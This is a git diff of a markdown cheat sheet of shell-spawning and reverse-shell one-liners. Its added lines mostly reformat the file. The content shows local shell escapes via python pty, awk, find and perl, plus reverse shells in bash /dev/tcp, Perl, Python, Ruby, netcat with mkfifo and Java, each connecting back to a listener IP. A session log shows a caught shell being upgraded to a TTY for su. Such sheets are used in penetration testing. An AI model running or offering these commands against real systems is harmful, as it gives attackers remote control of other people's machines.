@@ -1,26 +1,26 @@
+## Python
+
+`python -c 'import pty; pty.spawn("/bin/bash")'`
 
 
-python -c 'import pty; pty.spawn("/bin/bash")'
 
+## echo
 
+`echo os.system('/bin/bash')`
 
-echo
-
-echo os.system('/bin/bash')
-
-sh shell
+## sh shell
 
 /bin/sh -i
 
-awk
+## awk
 
-awk 'BEGIN {system("/bin/bash")}'
+`awk 'BEGIN {system("/bin/bash")}'`
 
-find
+## find
 
-find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
+`find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;`
 
-perl
+## perl
 
 perl -e 'exec "/bin/bash";'
 
@@ -55,31 +55,32 @@ perl -e 'use Socket;$i="192.168.1.140";$p=443;socket(S,PF_INET,SOCK_STREAM,getpr
 
 ====
 
-### REVERSE SHELL
+## REVERSE SHELL
 
 
 
 
-Bash
+### Bash
 
 Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
 
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 
-PERL
+### PERL
 
 Here’s a shorter, feature-free version of the perl-reverse-shell:
 
 perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
 There’s also an alternative PERL revere shell here.
-Python
+
+### Python
 
 This was tested under Linux / Python 2.7:
 
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
-PHP
+### PHP
 
 This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…
 
@@ -90,7 +91,7 @@ Ruby
 
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 
-Netcat
+### Netcat
 
 Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.
 
@@ -100,7 +101,7 @@ If you have the wrong version of netcat installed, Jeff Price points out here th
 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 
-Java
+### Java
 
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
@@ -120,3 +121,18 @@ Xnest :1
 You’ll need to authorise the target to connect to you (command also run on your host):
 
 xhost +targetip
+
+
+### Using Python To Get A TTY
+
+
+$ nc -v -n -l -p 1234
+listening on [any] 1234 …
+sh: no job control in this shell
+sh-3.2$ su -
+su: must be run from a terminal
+sh-3.2$ python -c ‘import pty; pty.spawn(“/bin/sh”)’
+sh-3.2$ su -
+su -
+Password:
+localhost ~ #
